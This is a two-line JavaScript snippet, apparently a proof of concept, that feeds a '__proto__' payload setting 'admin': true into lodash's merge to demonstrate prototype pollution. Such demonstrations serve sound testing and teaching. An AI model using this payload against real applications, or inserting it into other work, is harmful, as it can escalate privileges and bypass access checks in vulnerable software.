const _ = require('lodash');
console.log(_.merge({}, JSON.parse('{"__proto__": {"admin": true}}')));
